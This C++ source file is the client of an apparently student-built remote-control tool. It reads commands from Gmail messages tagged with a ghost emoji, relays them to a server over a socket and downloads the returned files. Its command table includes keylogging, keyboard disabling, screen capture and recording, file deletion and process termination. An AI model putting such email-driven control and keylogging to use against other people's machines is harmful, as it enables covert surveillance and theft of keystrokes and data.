#include "ClientSocket.hpp"
#include "./../GmailAPI/GmailAPI.hpp"
#include <unordered_map>

int main() {
    SetConsoleOutputCP(CP_UTF8);

    GmailAPI gmail(
        "./GmailAPI/oauth2.json", 
        "./GmailAPI/token.json", 
        "./GmailAPI/script-auto.ps1", 
        "./GmailAPI/message-list.txt"
    );

    gmail.startTokenRefreshThread();

    ClientSocket client;

    std::unordered_map<std::string, std::string> messageMap = {
        {"shutdown", "SHUTDOWN"},
        {"restart", "RESTART"},
        {"getIP", "GET_IP"},
        {"HelloServer", "HELLO_SERVER"},
        {"STOP", "STOP"},
        {"captureScreen", "CAPTURE_SCREEN"},
        {"copy", "COPY_FILE"},
        {"delete", "DELETE_FILE"},
        {"createFolder", "CREATE_FOLDER"},
        {"copyFolder", "COPY_FOLDER"},
        {"ls", "LIST_COMMANDS"},
        {"listProcess", "LIST_PROCESS"},
        {"listService", "LIST_SERVICES"},
        {"startApp", "START_APP"},
        {"terminateProcess", "TERMINATE_PROCESS"},
        {"listRunningApp", "LIST_RUNNING_APP"},
        {"listInstalledApp", "LIST_INSTALLED_APP"},
        {"listFiles", "LIST_FILES"},
        {"disableKeyboard", "DISABLE_KEYBOARD"},
        {"enableKeyboard", "ENABLE_KEYBOARD"},
        {"enableKeylogger", "ENABLE_KEYLOGGER"},
        {"disableKeylogger", "DISABLE_KEYLOGGER"},
        {"screenRecording", "SCREEN_RECORDING"}
    };

    try {
        char buffer[1024] = {0};
        int bytesReceived = 0;
        bool stopClient = false;

        while (!stopClient) {
            std::cout << "\t -> [Client] Client is querying for command ...\n";
            gmail.query("is:unread", "");
            for (const auto& command : messageMap) {
                std::string pattern = "👻 " + command.first;
                if (gmail.searchPattern(pattern)) {
                    std::string message = command.first;
                    send(client.getSocket(), message.c_str(), static_cast<int>(message.length()), 0);

                    if (message == "STOP") {
                        stopClient = true;
                        break;
                    }

                    if (message == "listProcess" ||
                        message == "listService" ||
                        message == "listRunningApp" ||
                        message == "listInstalledApp" ||
                        message == "listFiles" ||
                        message == "captureScreen" ||
                        message == "disableKeylogger" ) {
                        // Receive the file name from the server
                        memset(buffer, 0, sizeof(buffer));
                        bytesReceived = recv(client.getSocket(), buffer, sizeof(buffer) - 1, 0);
                        if (bytesReceived > 0) {
                            buffer[bytesReceived] = '\0';
                            std::cout << "\t-> [Response from server] " << buffer << '\n';

                            // Extract the file path from the server's response message
                            std::string response(buffer);
                            std::string filePath;
                            std::string keyword = " at ";
                            size_t pos = response.find(keyword);
                            if (pos != std::string::npos)
                                filePath = response.substr(pos + keyword.length());
                            else
                                continue;

                            // Extract the file name from the file path
                            std::string fileName = filePath.substr(filePath.find_last_of("/\\") + 1);
                            std::string outputFilePath = "./output-client/" + fileName;
                            client.receiveFile(outputFilePath);
                        } else {
                            std::cerr << "\t-> [Client] Failed to receive file name from the server.\n";
                        }
                    } else {
                        memset(buffer, 0, sizeof(buffer));
                        bytesReceived = recv(client.getSocket(), buffer, sizeof(buffer) - 1, 0);
                        if (bytesReceived > 0) {
                            buffer[bytesReceived] = '\0';
                            std::cout << "\t-> [Response from server] " << buffer << '\n';
                        } else {
                            std::cerr << "\t-> [Client] Failed to receive file name from the server.\n";
                        }
                    }
                }
            }
            gmail.markAsRead();
            Sleep(3000); // Sleep for 5 seconds before checking again
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        return 1;
    } catch (...) {
        std::cerr << "Unknown exception occurred." << std::endl;
        return 1;
    }

    gmail.stopTokenRefreshThread();

    std::cout << "Client has been stopped.\n";

    return 0;
}